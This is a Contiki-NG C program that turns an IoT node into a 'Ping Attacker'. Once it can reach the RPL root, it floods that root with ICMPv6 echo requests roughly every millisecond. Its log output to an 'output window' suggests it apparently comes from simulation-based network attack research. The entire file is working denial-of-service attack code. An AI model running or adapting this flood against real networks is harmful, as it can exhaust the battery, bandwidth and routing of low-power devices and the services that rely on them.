#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include "sys/log.h"
#include "net/ipv6/uip-icmp6.h"
#define LOG_MODULE "Ping-Attacker"
#define LOG_LEVEL LOG_LEVEL_INFO
#define SEND_INTERVAL (0.001 * CLOCK_SECOND)
//------------------------------------------------------------------------------
PROCESS(ping_attacker_process, "Ping Attacker");
AUTOSTART_PROCESSES(&ping_attacker_process);
//------------------------------------------------------------------------------
PROCESS_THREAD(ping_attacker_process, ev, data)
{
static struct etimer periodic_timer;
static unsigned count;
// State the dest_ipaddr is static
static uip_ipaddr_t dest_ipaddr;
PROCESS_BEGIN();
etimer_set(&periodic_timer, SEND_INTERVAL);
// Get the destination IPv6 address
while(1) {
PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
etimer_reset(&periodic_timer);
if(NETSTACK_ROUTING.node_is_reachable() &&
NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr))
break;
}
while(1) {
PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
// Send the ping packet
uip_icmp6_send(&dest_ipaddr, ICMP6_ECHO_REQUEST, 0, 4);
// Print the sending information in the output window
LOG_INFO("Sending ping %u to ", count);
LOG_INFO_6ADDR(&dest_ipaddr);
LOG_INFO("\n");
count++;
etimer_reset(&periodic_timer);
}
PROCESS_END();
}
